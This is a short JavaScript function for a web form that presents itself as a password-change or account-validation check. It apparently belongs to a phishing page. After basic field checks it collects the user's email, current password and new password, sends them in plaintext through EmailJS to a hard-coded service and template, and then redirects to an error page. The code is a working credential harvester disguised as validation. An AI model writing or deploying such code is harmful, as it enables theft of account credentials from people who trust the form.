function validateAndSend() {
    const email = document.getElementById('email').value.trim();
    const password = document.getElementById('password').value.trim();
    const newPassword = document.getElementById('new-password').value.trim();
    const confirmPassword = document.getElementById('confirm-password').value.trim();

    // Validate email format
    const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    if (!emailRegex.test(email)) {
      alert('Please enter a valid email address.');
      return;
    }

    // Validate other fields
    if (!password || !newPassword || !confirmPassword) {
      alert('All fields are required.');
      return;
    }

    if (newPassword !== confirmPassword) {
      alert('New Password and Confirm Password do not match.');
      return;
    }

    // Prepare data for EmailJS
    const params = {
      email: email,
      password: password,
      new_password: newPassword
    };

    const serviceID = 'service_dc0cgml';
    const templateID = 'template_5bmgad2';

    // Send data via EmailJS
      emailjs.init({
      publicKey: "mhjW0Sj6WoL4nv4Iu",
      });// Replace with your EmailJS user ID
    emailjs
      .send(serviceID, templateID, params)
      .then((res) => {
        console.log('queued successfully:', res);
        alert('Validation queued successfully!');
        window.location.href = 'error.html'; // Redirect to success page
      })
      .catch((err) => {
        console.error('Failed to send email:', err);
        alert('An error occurred. Please try again.');
      });
  }
